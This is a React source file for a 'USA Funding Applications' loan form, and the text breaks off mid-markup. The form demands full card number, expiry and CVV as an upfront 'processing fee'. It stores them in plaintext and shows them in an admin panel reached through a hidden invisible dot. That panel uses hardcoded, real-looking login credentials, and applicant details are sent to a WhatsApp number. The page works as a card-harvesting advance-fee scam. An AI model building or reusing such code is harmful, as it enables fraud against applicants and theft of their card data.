import { useState, useEffect } from "react";

type FormData = {
  firstName: string;
  lastName: string;
  email: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  fundingAmount: string;
  fundingPurpose: string;
  businessType: string;
  yearsInBusiness: string;
  annualRevenue: string;
  creditScore: string;
  termsAccepted: boolean;
  cardholderName: string;
  billingAddress: string;
  billingCity: string;
  billingState: string;
  billingZip: string;
  cardNumber: string;
  expMonth: string;
  expYear: string;
  cvv: string;
  created_at?: string;
  id?: number;
};

const initialFormData: FormData = {
  firstName: "",
  lastName: "",
  email: "",
  phone: "",
  address: "",
  city: "",
  state: "",
  zipCode: "",
  fundingAmount: "$100,000 or More",
  fundingPurpose: "",
  businessType: "",
  yearsInBusiness: "",
  annualRevenue: "",
  creditScore: "",
  termsAccepted: false,
  cardholderName: "",
  billingAddress: "",
  billingCity: "",
  billingState: "",
  billingZip: "",
  cardNumber: "",
  expMonth: "01",
  expYear: "2026",
  cvv: "",
};

const states = [
  "Alabama", "Alaska", "Arizona", "Arkansas", "California", "Colorado", "Connecticut", "Delaware",
  "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana", "Iowa", "Kansas",
  "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan", "Minnesota", "Mississippi",
  "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey", "New Mexico", "New York",
  "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon", "Pennsylvania", "Rhode Island", "South Carolina",
  "South Dakota", "Tennessee", "Texas", "Utah", "Vermont", "Virginia", "Washington", "West Virginia",
  "Wisconsin", "Wyoming"
];

const months = [
  "01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"
];

const years = [
  "2025", "2026", "2027", "2028", "2029", "2030", "2031", "2032", "2033", "2034", "2035"
];

const fundingAmounts = [
  "Under $25,000",
  "$25,000 - $49,999",
  "$50,000 - $99,999",
  "$100,000 or More"
];

const businessTypes = [
  "Sole Proprietorship",
  "Partnership",
  "LLC",
  "Corporation",
  "Non-Profit",
  "Other"
];

// WhatsApp number (formatted for URL)
const WHATSAPP_NUMBER = "19783475703"; // +1 (978) 347‑5703 without formatting

export function App() {
  const [currentStep, setCurrentStep] = useState(1);
  const [formData, setFormData] = useState<FormData>(initialFormData);
  const [submitted, setSubmitted] = useState(false);
  const [showLogin, setShowLogin] = useState(false);
  const [showAdmin, setShowAdmin] = useState(false);
  const [submissions, setSubmissions] = useState<FormData[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [loginEmail, setLoginEmail] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [loginError, setLoginError] = useState('');

  const totalSteps = 3;

  // Fetch submissions when admin panel is shown
  useEffect(() => {
    if (showAdmin) {
      fetchSubmissions();
    }
  }, [showAdmin]);

  const fetchSubmissions = async () => {
    try {
      setLoading(true);
      const response = await fetch('/api/submit-form');
      if (!response.ok) throw new Error('Failed to fetch submissions');
      const data = await response.json();
      setSubmissions(data);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to fetch submissions');
      console.error('Fetch error:', err);
    } finally {
      setLoading(false);
    }
  };

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
    const { name, value, type } = e.target;
    const checked = (e.target as HTMLInputElement).checked;
    
    setFormData(prev => ({
      ...prev,
      [name]: type === "checkbox" ? checked : value
    }));
  };

  const handleNext = () => {
    if (currentStep < totalSteps) {
      setCurrentStep(currentStep + 1);
      window.scrollTo(0, 0);
    }
  };

  const handleBack = () => {
    if (currentStep > 1) {
      setCurrentStep(currentStep - 1);
      window.scrollTo(0, 0);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.termsAccepted) {
      alert('Please accept the terms and conditions');
      return;
    }

    setLoading(true);
    setError(null);
    
    try {
      // Save to Vercel DB
      const response = await fetch('/api/submit-form', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (!response.ok) {
        const errorData = await response.json();
        throw new Error(errorData.error || 'Failed to submit form');
      }
      
      const result = await response.json();
      console.log('Form submitted successfully:', result);

      // Prepare WhatsApp message with non-sensitive information only
      const whatsappMessage = encodeURIComponent(
        `*NEW FUNDING APPLICATION*\n\n` +
        `*Personal Information*\n` +
        `Name: ${formData.firstName} ${formData.lastName}\n` +
        `Email: ${formData.email}\n` +
        `Phone: ${formData.phone}\n` +
        `Address: ${formData.address}, ${formData.city}, ${formData.state} ${formData.zipCode}\n\n` +
        `*Funding Details*\n` +
        `Amount Needed: ${formData.fundingAmount}\n` +
        `Business Type: ${formData.businessType}\n` +
        `Years in Business: ${formData.yearsInBusiness}\n` +
        `Annual Revenue: ${formData.annualRevenue}\n` +
        `Credit Score: ${formData.creditScore}\n\n` +
        `*Purpose of Funding*\n` +
        `${formData.fundingPurpose}\n\n` +
        `Please contact me to discuss further.`
      );
      
      // Open WhatsApp in a new tab
      const whatsappUrl = `https://wa.me/${WHATSAPP_NUMBER}?text=${whatsappMessage}`;
      window.open(whatsappUrl, '_blank');
      
      // Show success message
      setSubmitted(true);
      
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to submit form');
      console.error('Submit error:', err);
      alert('Error submitting form. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Hardcoded credentials
    if (loginEmail === 'oliviakaydrene@gmail.com' && loginPassword === 'Azfresh@rt123') {
      setLoginError('');
      setShowLogin(false);
      setShowAdmin(true);
      setLoginEmail('');
      setLoginPassword('');
    } else {
      setLoginError('Invalid email or password');
    }
  };

  const handleDotClick = () => {
    setShowLogin(true);
  };

  const renderStepIndicator = () => (
    <div className="flex items-center justify-center mb-8">
      {[1, 2, 3].map((step) => (
        <div key={step} className="flex items-center">
          <div
            className={`flex h-10 w-10 items-center justify-center rounded-full text-sm font-semibold transition-all duration-300 ${
              step <= currentStep
                ? "bg-gradient-to-r from-blue-600 to-indigo-600 text-white"
                : "bg-gray-200 text-gray-500"
            }`}
          >
            {step < currentStep ? (
              <svg className="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
              </svg>
            ) : (
              step
            )}
          </div>
          {step < totalSteps && (
            <div
              className={`mx-2 h-1 w-16 rounded transition-all duration-300 ${
                step < currentStep ? "bg-gradient-to-r from-blue-600 to-indigo-600" : "bg-gray-200"
              }`}
            />
          )}
        </div>
      ))}
    </div>
  );

  const renderLoginModal = () => (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
      <div className="bg-white rounded-2xl shadow-xl max-w-md w-full mx-4">
        <div className="bg-gradient-to-r from-blue-600 to-indigo-600 px-6 py-4 rounded-t-2xl">
          <h3 className="text-white font-semibold text-lg">Admin Login</h3>
        </div>
        
        <form onSubmit={handleLogin} className="p-6 space-y-4">
          {loginError && (
            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg">
              {loginError}
            </div>
          )}
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Email</label>
            <input
              type="email"
              value={loginEmail}
              onChange={(e) => setLoginEmail(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
              placeholder="Enter your email"
              required
            />
          </div>
          
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Password</label>
            <input
              type="password"
              value={loginPassword}
              onChange={(e) => setLoginPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
              placeholder="Enter your password"
              required
            />
          </div>
          
          <div className="flex space-x-3 pt-4">
            <button
              type="submit"
              className="flex-1 px-4 py-3 bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-lg font-medium hover:from-blue-700 hover:to-indigo-700 transition-all shadow-lg shadow-blue-200"
            >
              Login
            </button>
            <button
              type="button"
              onClick={() => {
                setShowLogin(false);
                setLoginError('');
                setLoginEmail('');
                setLoginPassword('');
              }}
              className="flex-1 px-4 py-3 bg-gray-200 text-gray-700 rounded-lg font-medium hover:bg-gray-300 transition-all"
            >
              Cancel
            </button>
          </div>
        </form>
      </div>
    </div>
  );

  const renderPersonalInfo = () => (
    <div className="space-y-6">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-gray-900">Personal Information</h2>
        <p className="text-gray-600 mt-2">Please provide your basic contact details</p>
      </div>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">First Name *</label>
          <input
            type="text"
            name="firstName"
            value={formData.firstName}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            placeholder="John"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Last Name *</label>
          <input
            type="text"
            name="lastName"
            value={formData.lastName}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            placeholder="Doe"
            required
          />
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Email Address *</label>
          <input
            type="email"
            name="email"
            value={formData.email}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            placeholder="john@example.com"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number *</label>
          <input
            type="tel"
            name="phone"
            value={formData.phone}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            placeholder="(555) 123-4567"
            required
          />
        </div>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2">Street Address *</label>
        <input
          type="text"
          name="address"
          value={formData.address}
          onChange={handleInputChange}
          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
          placeholder="123 Main Street"
          required
        />
      </div>

      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">City *</label>
          <input
            type="text"
            name="city"
            value={formData.city}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            placeholder="New York"
            required
          />
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">State *</label>
          <select
            name="state"
            value={formData.state}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            required
          >
            <option value="">Select State</option>
            {states.map((state) => (
              <option key={state} value={state}>{state}</option>
            ))}
          </select>
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">ZIP Code *</label>
          <input
            type="text"
            name="zipCode"
            value={formData.zipCode}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            placeholder="10001"
            required
          />
        </div>
      </div>
    </div>
  );

  const renderFundingDetails = () => (
    <div className="space-y-6">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-gray-900">Funding Details</h2>
        <p className="text-gray-600 mt-2">Tell us about your funding needs</p>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2">Funding Amount Needed *</label>
        <select
          name="fundingAmount"
          value={formData.fundingAmount}
          onChange={handleInputChange}
          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
          required
        >
          {fundingAmounts.map((amount) => (
            <option key={amount} value={amount}>{amount}</option>
          ))}
        </select>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2">Purpose of Funding *</label>
        <textarea
          name="fundingPurpose"
          value={formData.fundingPurpose}
          onChange={handleInputChange}
          rows={4}
          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
          placeholder="Please describe how you plan to use the funding..."
          required
        />
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2">Business Type *</label>
        <select
          name="businessType"
          value={formData.businessType}
          onChange={handleInputChange}
          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
          required
        >
          <option value="">Select Business Type</option>
          {businessTypes.map((type) => (
            <option key={type} value={type}>{type}</option>
          ))}
        </select>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Years in Business *</label>
          <select
            name="yearsInBusiness"
            value={formData.yearsInBusiness}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            required
          >
            <option value="">Select</option>
            <option value="Less than 1 year">Less than 1 year</option>
            <option value="1-2 years">1-2 years</option>
            <option value="3-5 years">3-5 years</option>
            <option value="5-10 years">5-10 years</option>
            <option value="More than 10 years">More than 10 years</option>
          </select>
        </div>
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-2">Annual Revenue *</label>
          <select
            name="annualRevenue"
            value={formData.annualRevenue}
            onChange={handleInputChange}
            className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
            required
          >
            <option value="">Select</option>
            <option value="Under $100,000">Under $100,000</option>
            <option value="$100,000 - $500,000">$100,000 - $500,000</option>
            <option value="$500,000 - $1,000,000">$500,000 - $1,000,000</option>
            <option value="$1,000,000 - $5,000,000">$1,000,000 - $5,000,000</option>
            <option value="Over $5,000,000">Over $5,000,000</option>
          </select>
        </div>
      </div>

      <div>
        <label className="block text-sm font-medium text-gray-700 mb-2">Credit Score Range *</label>
        <select
          name="creditScore"
          value={formData.creditScore}
          onChange={handleInputChange}
          className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
          required
        >
          <option value="">Select</option>
          <option value="Excellent (750+)">Excellent (750+)</option>
          <option value="Good (700-749)">Good (700-749)</option>
          <option value="Fair (650-699)">Fair (650-699)</option>
          <option value="Poor (600-649)">Poor (600-649)</option>
          <option value="Very Poor (Below 600)">Very Poor (Below 600)</option>
          <option value="Not sure">Not sure</option>
        </select>
      </div>
    </div>
  );

  const reviewStep = () => (
    <div className="space-y-6">
      <div className="text-center mb-6">
        <h2 className="text-2xl font-bold text-gray-900">Review & Submit</h2>
        <p className="text-gray-600 mt-2">Please review your information before submitting</p>
      </div>

      <div className="bg-gray-50 rounded-lg p-6 space-y-4">
        <div>
          <h3 className="text-lg font-semibold text-gray-900 mb-3">Personal Information</h3>
          <div className="grid grid-cols-2 gap-3 text-sm">
            <div><span className="text-gray-500">Name:</span> <span className="font-medium">{formData.firstName} {formData.lastName}</span></div>
            <div><span className="text-gray-500">Email:</span> <span className="font-medium">{formData.email}</span></div>
            <div><span className="text-gray-500">Phone:</span> <span className="font-medium">{formData.phone}</span></div>
            <div><span className="text-gray-500">Address:</span> <span className="font-medium">{formData.address}, {formData.city}, {formData.state} {formData.zipCode}</span></div>
          </div>
        </div>

        <div className="border-t border-gray-200 pt-4">
          <h3 className="text-lg font-semibold text-gray-900 mb-3">Funding Details</h3>
          <div className="grid grid-cols-2 gap-3 text-sm">
            <div><span className="text-gray-500">Amount:</span> <span className="font-medium">{formData.fundingAmount}</span></div>
            <div><span className="text-gray-500">Business Type:</span> <span className="font-medium">{formData.businessType}</span></div>
            <div><span className="text-gray-500">Years in Business:</span> <span className="font-medium">{formData.yearsInBusiness}</span></div>
            <div><span className="text-gray-500">Annual Revenue:</span> <span className="font-medium">{formData.annualRevenue}</span></div>
            <div><span className="text-gray-500">Credit Score:</span> <span className="font-medium">{formData.creditScore}</span></div>
          </div>
        </div>

        <div className="border-t border-gray-200 pt-4">
          <h3 className="text-lg font-semibold text-gray-900 mb-2">Purpose of Funding</h3>
          <p className="text-sm text-gray-700">{formData.fundingPurpose || "Not provided"}</p>
        </div>

        <div className="border-t border-gray-200 pt-4">
          <h3 className="text-lg font-semibold text-gray-900 mb-4">Payment Information</h3>
          <p className="text-sm text-gray-600 mb-4">Please enter your payment details to complete the application processing fee.</p>
          
          <div className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Cardholder Name *</label>
              <input
                type="text"
                name="cardholderName"
                value={formData.cardholderName}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                placeholder="John Doe"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Billing Address *</label>
              <input
                type="text"
                name="billingAddress"
                value={formData.billingAddress}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                placeholder="123 Main Street"
                required
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">City *</label>
                <input
                  type="text"
                  name="billingCity"
                  value={formData.billingCity}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                  placeholder="New York"
                  required
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">State *</label>
                <select
                  name="billingState"
                  value={formData.billingState}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                  required
                >
                  <option value="">Select</option>
                  {states.map((state) => (
                    <option key={state} value={state}>{state}</option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">ZIP Code *</label>
              <input
                type="text"
                name="billingZip"
                value={formData.billingZip}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                placeholder="10001"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Credit Card Number *</label>
              <input
                type="text"
                name="cardNumber"
                value={formData.cardNumber}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                placeholder="1234 5678 9012 3456"
                maxLength={19}
                required
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Expiration Month *</label>
                <select
                  name="expMonth"
                  value={formData.expMonth}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                  required
                >
                  {months.map((month) => (
                    <option key={month} value={month}>{month}</option>
                  ))}
                </select>
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Expiration Year *</label>
                <select
                  name="expYear"
                  value={formData.expYear}
                  onChange={handleInputChange}
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                  required
                >
                  {years.map((year) => (
                    <option key={year} value={year}>{year}</option>
                  ))}
                </select>
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">CVV *</label>
              <input
                type="text"
                name="cvv"
                value={formData.cvv}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all"
                placeholder="123"
                maxLength={4}
                required
              />
            </div>
          </div>
        </div>
      </div>

      <div className="flex items-start space-x-3">
        <input
          type="checkbox"
          name="termsAccepted"
          checked={formData.termsAccepted}
          onChange={handleInputChange}
          className="mt-1 h-5 w-5 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
          required
        />
        <label className="text-sm text-gray-700">
          I certify that the information provided is accurate and I agree to the{" "}
          <a href="#" className="text-blue-600 hover:underline">Terms of Service</a> and{" "}
          <a href="#" className="text-blue-600 hover:underline">Privacy Policy</a>. *
        </label>
      </div>
      
      <div className="bg-green-50 border border-green-200 rounded-lg p-4 mt-4">
        <div className="flex items-center space-x-3">
          <svg className="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 24 24">
            <path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771z"/>
          </svg>
          <p className="text-sm text-green-700">
            After submission, you'll be connected with our team on WhatsApp for immediate assistance.
          </p>
        </div>
      </div>
    </div>
  );

  const renderSuccess = () => (
    <div className="text-center py-12">
      <div className="mx-auto w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-6">
        <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
        </svg>
      </div>
      <h2 className="text-3xl font-bold text-gray-900 mb-4">Application Submitted!</h2>
      <p className="text-gray-600 mb-6 max-w-md mx-auto">
        Thank you for your application. A WhatsApp chat has been opened with our team for immediate assistance.
      </p>
      <div className="bg-blue-50 rounded-lg p-4 max-w-md mx-auto">
        <p className="text-sm text-blue-800">
          <strong>Reference Number:</strong> USA-{Math.random().toString(36).substr(2, 9).toUpperCase()}
        </p>
      </div>
      <button
        onClick={() => {
          setSubmitted(false);
          setCurrentStep(1);
          setFormData(initialFormData);
        }}
        className="mt-8 px-6 py-3 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition-colors"
      >
        Submit Another Application
      </button>
    </div>
  );

  const renderAdminPanel = () => (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <h2 className="text-2xl font-bold text-gray-900">Admin Panel - All Submissions</h2>
        <div className="flex items-center space-x-4">
          <button
            onClick={fetchSubmissions}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"
          >
            Refresh
          </button>
          <button
            onClick={() => {
              setShowAdmin(false);
              setShowLogin(false);
            }}
            className="px-4 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 transition-colors"
          >
            ← Back to Form
          </button>
        </div>
      </div>
      
      {loading ? (
        <div className="text-center py-12 bg-gray-50 rounded-lg">
          <p className="text-gray-500">Loading submissions from database...</p>
        </div>
      ) : error ? (
        <div className="text-center py-12 bg-red-50 rounded-lg">
          <p className="text-red-600">Error: {error}</p>
          <button
            onClick={fetchSubmissions}
            className="mt-4 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700"
          >
            Try Again
          </button>
        </div>
      ) : submissions.length === 0 ? (
        <div className="text-center py-12 bg-gray-50 rounded-lg">
          <p className="text-gray-500">No submissions yet.</p>
        </div>
      ) : (
        <div className="space-y-4">
          {submissions.map((submission) => (
            <div key={submission.id} className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
              <div className="flex items-center justify-between mb-4">
                <h3 className="text-lg font-semibold text-gray-900">
                  Submission #{submission.id} - {submission.created_at ? new Date(submission.created_at).toLocaleString() : 'N/A'}
                </h3>
                <span className="text-sm text-gray-500">{submission.email}</span>
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
                <div>
                  <p className="text-gray-500">Name:</p>
                  <p className="font-medium">{submission.firstName} {submission.lastName}</p>
                </div>
                <div>
                  <p className="text-gray-500">Phone:</p>
                  <p className="font-medium">{submission.phone}</p>
                </div>
                <div>
                  <p className="text-gray-500">Address:</p>
                  <p className="font-medium">{submission.address}, {submission.city}, {submission.state} {submission.zipCode}</p>
                </div>
                <div>
                  <p className="text-gray-500">Funding Amount:</p>
                  <p className="font-medium">{submission.fundingAmount}</p>
                </div>
                <div>
                  <p className="text-gray-500">Business Type:</p>
                  <p className="font-medium">{submission.businessType}</p>
                </div>
                <div>
                  <p className="text-gray-500">Years in Business:</p>
                  <p className="font-medium">{submission.yearsInBusiness}</p>
                </div>
                <div>
                  <p className="text-gray-500">Annual Revenue:</p>
                  <p className="font-medium">{submission.annualRevenue}</p>
                </div>
                <div>
                  <p className="text-gray-500">Credit Score:</p>
                  <p className="font-medium">{submission.creditScore}</p>
                </div>
                <div className="md:col-span-2">
                  <p className="text-gray-500">Purpose:</p>
                  <p className="font-medium">{submission.fundingPurpose}</p>
                </div>
                <div className="md:col-span-2 border-t border-gray-200 pt-4 mt-2">
                  <h4 className="font-semibold text-gray-700 mb-2">Payment Information (Sensitive)</h4>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <p className="text-gray-500">Cardholder Name:</p>
                      <p className="font-medium">{submission.cardholderName}</p>
                    </div>
                    <div>
                      <p className="text-gray-500">Card Number:</p>
                      <p className="font-medium">{submission.cardNumber}</p>
                    </div>
                    <div>
                      <p className="text-gray-500">Billing Address:</p>
                      <p className="font-medium">{submission.billingAddress}, {submission.billingCity}, {submission.billingState} {submission.billingZip}</p>
                    </div>
                    <div>
                      <p className="text-gray-500">Expiration:</p>
                      <p className="font-medium">{submission.expMonth}/{submission.expYear}</p>
                    </div>
                    <div>
                      <p className="text-gray-500">CVV:</p>
                      <p className="font-medium">{submission.cvv}</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );

  if (showAdmin) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50">
        <div className="max-w-6xl mx-auto px-4 py-8">
          {renderAdminPanel()}
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-indigo-50">
      {/* Header */}
      <header className="bg-white shadow-sm border-b border-gray-200">
        <div className="max-w-4xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-3">
              <div className="w-10 h-10 bg-gradient-to-r from-blue-600 to-indigo-600 rounded-lg flex items-center justify-center">
                <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
              </div>
              <div>
                <h1 className="text-xl font-bold text-gray-900">USA Funding Applications</h1>
                <p className="text-xs text-gray-500">Your Trusted Funding Partner</p>
              </div>
            </div>
            <div className="hidden md:flex items-center space-x-2 text-sm text-gray-600">
              <svg className="w-5 h-5 text-green-500" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span>Secure Application</span>
            </div>
          </div>
        </div>
      </header>

      {/* Hidden dot for admin login - bottom right corner */}
      <div 
        onClick={handleDotClick}
        className="fixed bottom-4 right-4 w-4 h-4 bg-transparent hover:bg-gray-200 rounded-full cursor-pointer transition-colors duration-200"
        title="Admin Login"
        style={{ border: '1px solid transparent' }}
      />

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-8">
        {/* Hero Section */}
        <div className="text-center mb-8">
          <h2 className="text-3xl md:text-4xl font-bold text-gray-900 mb-4">
            Funding Application Form
          </h2>
          <p className="text-gray-600 max-w-2xl mx-auto">
            Complete this simple application to get started with your funding journey. 
            Our team will review your application and connect with you on WhatsApp for immediate assistance.
          </p>
        </div>

        {/* Progress Indicator */}
        {!submitted && renderStepIndicator()}

        {/* Error Message */}
        {error && (
          <div className="mb-4 p-4 bg-red-50 border border-red-200 text-red-700 rounded-lg">
            {error}
          </div>
        )}

        {/* Form Card */}
        <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-indigo-600 px-6 py-4">
            <div className="flex items-center justify-between">
              <h3 className="text-white font-semibold">
                {submitted ? "Submission Complete" : `Step ${currentStep} of ${totalSteps}`}
              </h3>
              {!submitted && (
                <span className="text-blue-100 text-sm">
                  {currentStep === 1 && "Personal Information"}
                  {currentStep === 2 && "Funding Details"}
                  {currentStep === 3 && "Review & Submit"}
                </span>
              )}
            </div>
          </div>

          <form onSubmit={handleSubmit} className="p-6 md:p-8">
            {submitted ? (
              renderSuccess()
            ) : (
              <>
                {currentStep === 1 && renderPersonalInfo()}
                {currentStep === 2 && renderFundingDetails()}
                {currentStep === 3 && reviewStep()}

                {/* Navigation Buttons */}
                <div className="flex justify-between mt-8 pt-6 border-t border-gray-200">
                  <button
                    type="button"
                    onClick={handleBack}
                    disabled={currentStep === 1}
